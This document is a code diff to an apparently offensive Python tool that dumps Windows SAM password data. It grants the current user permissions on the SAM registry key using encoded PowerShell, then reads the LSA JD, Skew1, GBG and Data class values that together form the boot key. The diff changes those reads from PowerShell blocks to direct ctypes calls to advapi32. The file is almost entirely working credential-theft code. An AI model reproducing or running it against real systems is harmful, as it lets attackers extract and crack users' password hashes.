@@ -30,6 +30,23 @@ os.system('cls' if os.name == 'nt' else 'clear')
 
 def getRegistryValues(HexRID):
     from subprocess import Popen, PIPE
+    from ctypes import c_uint, c_char_p, byref, windll
+    def RegOpenKeyEx(subkey):
+        hkey = c_uint(0) ## Initialize to an int
+        windll.advapi32.RegOpenKeyExA(0x80000002, 'SYSTEM\\CurrentControlSet\\Control\\Lsa\\' + subkey, 0, 0x19, byref(hkey))
+        return hkey.value
+    def RegQueryInfoKey(hkey):
+        classname = c_char_p('aabbccdd') ## Initialize to 4 bytes
+        windll.advapi32.RegQueryInfoKeyA(hkey,classname,byref(c_uint(1024)),None,None,None,None,None,None,None,None,0)
+        return classname.value
+    def RegCloseKey(subkey):
+        windll.advapi32.RegCloseKey(subkey)
+        return
+    def getRegClass(subkey):
+        hKey = RegOpenKeyEx(subkey) ## Open Registry Key and get handle
+        value = RegQueryInfoKey(hKey) ## Read out the Class Name
+        RegCloseKey(hKey) ## Close key
+        return value
     print('##### -- Hold on, retrieving registry data, may take some seconds -- #####')
     ## AddPermissionsForSAMDump
     addpermissions = '''$rule = New-Object System.Security.AccessControl.RegistryAccessRule([System.Security.Principal.WindowsIdentity]::GetCurrent().Name,"FullControl",[System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit",[System.Security.AccessControl.PropagationFlags]"None",[System.Security.AccessControl.AccessControlType]"Allow"); $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey("SAM\SAM\Domains",[Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,[System.Security.AccessControl.RegistryRights]::ChangePermissions); $acl = $key.GetAccessControl(); $acl.SetAccessRule($rule); $key.SetAccessControl($acl); '''
@@ -46,19 +63,11 @@ def getRegistryValues(HexRID):
     ## FixPermissionsForSAMDump
     fixpermissions = '''$key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey("SAM\SAM\Domains",[Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,[System.Security.AccessControl.RegistryRights]::ChangePermissions); $acl = $key.GetAccessControl(); $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name; $acl.Access | where {$_.IdentityReference.Value -eq $user} | %{$acl.RemoveAccessRule($_)} | Out-Null; Set-Acl HKLM:\SAM\SAM\Domains $acl'''
     os.system('powershell -enc '+base64.b64encode(fixpermissions.encode('utf_16_le')))
-    ## Use Windows API via Powershell to get Class Values for JD, Skew1, GBG and Data
-    getjd = '''$x = '[DllImport("advapi32.dll", CharSet = CharSet.Auto)]public static extern int RegOpenKeyEx(int hKey, string subKey, int ulOptions, int samDesired, out int hkResult);[DllImport("advapi32.dll", SetLastError = true)]public static extern int RegCloseKey(int hKey);[DllImport("advapi32.dll", EntryPoint = "RegQueryInfoKey", CallingConvention = CallingConvention.Winapi, SetLastError = true)]public static extern int RegQueryInfoKey(int hkey, System.Text.StringBuilder lpClass, ref int lpcbClass, int lpReserved, out int lpcSubKeys, out int lpcbMaxSubKeyLen, out int lpcbMaxClassLen, out int lpcValues, out int lpcbMaxValueNameLen, out int lpcbMaxValueLen, out int lpcbSecurityDescriptor, IntPtr lpftLastWriteTime);'; $y = Add-Type -MemberDefinition $x -Name "Win32" -Namespace Win32Functions -PassThru; [int]$keyhandleid = 0; $y::RegOpenKeyEx(0x80000002,'SYSTEM\CurrentControlSet\Control\Lsa\JD',0,0x19,[ref]$keyhandleid)  | Out-Null; $classVal = New-Object System.Text.StringBuilder 1024; $y::RegQueryInfoKey($keyhandleid, $classVal,[ref]1024,0,[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,0) | Out-Null; Write-Host($classVal.ToString()); $y::RegCloseKey($keyhandleid) | Out-Null;'''
-    proc=Popen(r'powershell -enc '+base64.b64encode(getjd.encode('utf_16_le')), shell=True, stdout=PIPE)
-    jd = proc.stdout.readlines()[0].strip()
-    getskew1 = '''$x = '[DllImport("advapi32.dll", CharSet = CharSet.Auto)]public static extern int RegOpenKeyEx(int hKey, string subKey, int ulOptions, int samDesired, out int hkResult);[DllImport("advapi32.dll", SetLastError = true)]public static extern int RegCloseKey(int hKey);[DllImport("advapi32.dll", EntryPoint = "RegQueryInfoKey", CallingConvention = CallingConvention.Winapi, SetLastError = true)]public static extern int RegQueryInfoKey(int hkey, System.Text.StringBuilder lpClass, ref int lpcbClass, int lpReserved, out int lpcSubKeys, out int lpcbMaxSubKeyLen, out int lpcbMaxClassLen, out int lpcValues, out int lpcbMaxValueNameLen, out int lpcbMaxValueLen, out int lpcbSecurityDescriptor, IntPtr lpftLastWriteTime);'; $y = Add-Type -MemberDefinition $x -Name "Win32" -Namespace Win32Functions -PassThru; [int]$keyhandleid = 0; $y::RegOpenKeyEx(0x80000002,'SYSTEM\CurrentControlSet\Control\Lsa\Skew1',0,0x19,[ref]$keyhandleid)  | Out-Null; $classVal = New-Object System.Text.StringBuilder 1024; $y::RegQueryInfoKey($keyhandleid, $classVal,[ref]1024,0,[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,0) | Out-Null; Write-Host($classVal.ToString()); $y::RegCloseKey($keyhandleid) | Out-Null;'''
-    proc=Popen(r'powershell -enc '+base64.b64encode(getskew1.encode('utf_16_le')), shell=True, stdout=PIPE)
-    skew1 = proc.stdout.readlines()[0].strip()
-    getgbg = '''$x = '[DllImport("advapi32.dll", CharSet = CharSet.Auto)]public static extern int RegOpenKeyEx(int hKey, string subKey, int ulOptions, int samDesired, out int hkResult);[DllImport("advapi32.dll", SetLastError = true)]public static extern int RegCloseKey(int hKey);[DllImport("advapi32.dll", EntryPoint = "RegQueryInfoKey", CallingConvention = CallingConvention.Winapi, SetLastError = true)]public static extern int RegQueryInfoKey(int hkey, System.Text.StringBuilder lpClass, ref int lpcbClass, int lpReserved, out int lpcSubKeys, out int lpcbMaxSubKeyLen, out int lpcbMaxClassLen, out int lpcValues, out int lpcbMaxValueNameLen, out int lpcbMaxValueLen, out int lpcbSecurityDescriptor, IntPtr lpftLastWriteTime);'; $y = Add-Type -MemberDefinition $x -Name "Win32" -Namespace Win32Functions -PassThru; [int]$keyhandleid = 0; $y::RegOpenKeyEx(0x80000002,'SYSTEM\CurrentControlSet\Control\Lsa\GBG',0,0x19,[ref]$keyhandleid)  | Out-Null; $classVal = New-Object System.Text.StringBuilder 1024; $y::RegQueryInfoKey($keyhandleid, $classVal,[ref]1024,0,[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,0) | Out-Null; Write-Host($classVal.ToString()); $y::RegCloseKey($keyhandleid) | Out-Null;'''
-    proc=Popen(r'powershell -enc '+base64.b64encode(getgbg.encode('utf_16_le')), shell=True, stdout=PIPE)
-    gbg = proc.stdout.readlines()[0].strip()
-    getdata = '''$x = '[DllImport("advapi32.dll", CharSet = CharSet.Auto)]public static extern int RegOpenKeyEx(int hKey, string subKey, int ulOptions, int samDesired, out int hkResult);[DllImport("advapi32.dll", SetLastError = true)]public static extern int RegCloseKey(int hKey);[DllImport("advapi32.dll", EntryPoint = "RegQueryInfoKey", CallingConvention = CallingConvention.Winapi, SetLastError = true)]public static extern int RegQueryInfoKey(int hkey, System.Text.StringBuilder lpClass, ref int lpcbClass, int lpReserved, out int lpcSubKeys, out int lpcbMaxSubKeyLen, out int lpcbMaxClassLen, out int lpcValues, out int lpcbMaxValueNameLen, out int lpcbMaxValueLen, out int lpcbSecurityDescriptor, IntPtr lpftLastWriteTime);'; $y = Add-Type -MemberDefinition $x -Name "Win32" -Namespace Win32Functions -PassThru; [int]$keyhandleid = 0; $y::RegOpenKeyEx(0x80000002,'SYSTEM\CurrentControlSet\Control\Lsa\Data',0,0x19,[ref]$keyhandleid)  | Out-Null; $classVal = New-Object System.Text.StringBuilder 1024; $y::RegQueryInfoKey($keyhandleid, $classVal,[ref]1024,0,[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,0) | Out-Null; Write-Host($classVal.ToString()); $y::RegCloseKey($keyhandleid) | Out-Null;'''
-    proc=Popen(r'powershell -enc '+base64.b64encode(getdata.encode('utf_16_le')), shell=True, stdout=PIPE)
-    data = proc.stdout.readlines()[0].strip()
+    ## Use Windows API to get Class Values for JD, Skew1, GBG and Data
+    jd = getRegClass('JD')
+    skew1 = getRegClass('Skew1')
+    gbg = getRegClass('GBG')
+    data = getRegClass('Data')
     return str(HexRegHash.strip()), str(HexRegSysk.strip()), jd, skew1, gbg, data
 
 ## Data and key as hex string ('ABCDEFGH')
